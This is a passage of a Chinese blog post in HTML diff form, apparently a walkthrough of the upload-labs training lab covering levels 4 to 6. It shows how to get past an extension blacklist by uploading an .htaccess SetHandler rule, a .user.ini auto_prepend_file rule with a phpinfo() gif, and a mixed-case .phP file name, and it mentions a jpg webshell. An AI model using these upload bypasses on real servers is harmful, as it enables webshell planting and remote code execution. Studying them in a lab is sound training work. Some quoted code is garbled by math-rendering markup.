+<h2 id="pass-4"><a class="markdownIt-Anchor" href="#pass-4"></a> Pass-4</h2>
+<p><strong>注：这里需要5.6版本以下且未开启nts的php</strong></p>
+<p>查看源码，还是黑名单过滤，发现过滤了大多数文件名</p>
+<p>$deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.php1&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.pHp1&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.ini&quot;);</p>
+<p>但是没有过滤.htaccess文件</p>
+<p><strong>.htaccess****文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过.htaccess文件，可以实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能IIS平台上不存在该文件，该文件默认开启，启用和关闭在httpd.conf文件中配置</strong>。</p>
+<p>就是说，我们只要能上传这个文件，就可以改变相应目录下的文件配置</p>
+<p>首先上传一个.htaccess文件内容为</p>
+<p>SetHandler application/x-httpd-php</p>
+<p>作用是使所有文件都被解析成PHP</p>
+<p><img src="/2021/05/13/upload-labs-%E5%AD%A6%E4%B9%A0/clip_image028.jpg" alt="img"></p>
+<p>抓包把文件名改为.htaccess</p>
+<p><img src="/2021/05/13/upload-labs-%E5%AD%A6%E4%B9%A0/clip_image030.jpg" alt="img"></p>
+<p>这时应该成功上传了</p>
+<p><img src="/2021/05/13/upload-labs-%E5%AD%A6%E4%B9%A0/clip_image0322.jpg" alt="img"></p>
+<p>然后尝试上传一个jpg的马</p>
+<p><img src="/2021/05/13/upload-labs-%E5%AD%A6%E4%B9%A0/clip_image034.jpg" alt="img"></p>
+<p>菜刀连接不上，但是这个jpg是确实可以解析成php的，把jpg内容修改为如下，重新上传</p>
+<p><img src="/2021/05/13/upload-labs-%E5%AD%A6%E4%B9%A0/clip_image036.jpg" alt="img"></p>
+<p>这个时候访问就可以看到jpg已经被解析为php了</p>
+<p><img src="/2021/05/13/upload-labs-%E5%AD%A6%E4%B9%A0/clip_image038.jpg" alt="img"></p>
+<h2 id="pass-5"><a class="markdownIt-Anchor" href="#pass-5"></a> Pass-5</h2>
+<p>查看源码过滤了.htaccess文件，而提示是上传目录存在readme.php文件</p>
+<p><img src="/2021/05/13/upload-labs-%E5%AD%A6%E4%B9%A0/clip_image040.jpg" alt="img"><img src="/2021/05/13/upload-labs-%E5%AD%A6%E4%B9%A0/clip_image042.jpg" alt="img"></p>
+<p>这里我们用到一个.user.ini的文件，.user.ini实际上就是一个可以由用户“自定义”的php.ini，而有些配置项可以用来利用，比如auto_append_file，可以指定一个文件，自动包含在要执行的文件前，所以我们先上传一个名为.user.ini的文件，内容是auto_prepend_file=1.gif</p>
+<p><img src="/2021/05/13/upload-labs-%E5%AD%A6%E4%B9%A0/clip_image044.jpg" alt="img"></p>
+<p>然后我们上传一个1.gif的文件，内容为</p>
+<?php
+
+ phpinfo(); 
+
+?>
+<p><img src="/2021/05/13/upload-labs-%E5%AD%A6%E4%B9%A0/clip_image046.jpg" alt="img"></p>
+<p>当我们访问readme.php时，就可以调用1.gif的内容了</p>
+<p>如下，可以看到这里1.gif中的phpinfo函数被调用了</p>
+<p><img src="/2021/05/13/upload-labs-%E5%AD%A6%E4%B9%A0/clip_image048.jpg" alt="img"></p>
+<h2 id="pass-6"><a class="markdownIt-Anchor" href="#pass-6"></a> Pass-6</h2>
+<p>这里查看源码，里面相对pass-4少了<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>f</mi><mi>i</mi><mi>l</mi><msub><mi>e</mi><mi>e</mi></msub><mi>x</mi><mi>t</mi><mo>=</mo><mi>s</mi><mi>t</mi><mi>r</mi><mi>t</mi><mi>o</mi><mi>l</mi><mi>o</mi><mi>w</mi><mi>e</mi><mi>r</mi><mo stretchy="false">(</mo></mrow><annotation encoding="application/x-tex">file_ext = strtolower(</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mord mathdefault">i</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord"><span class="mord mathdefault">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">e</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault">x</span><span class="mord mathdefault">t</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">s</span><span class="mord mathdefault">t</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">t</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mopen">(</span></span></span></span>file_ext); //转换为小写</p>
+<p>这段代码，尝试采用.phP格式上传绕过</p>
+<p><img src="/2021/05/13/upload-labs-%E5%AD%A6%E4%B9%A0/clip_image050.jpg" alt="img"></p>
+<p>这里上传成功了</p>
+<p><img src="/2021/05/13/upload-labs-%E5%AD%A6%E4%B9%A0/clip_image052.jpg" alt="img"></p>
+<p><img src="/2021/05/13/upload-labs-%E5%AD%A6%E4%B9%A0/clip_image054.jpg" alt="img"></p>
 ]]></content>
       <categories>
         <category>web学习</category>
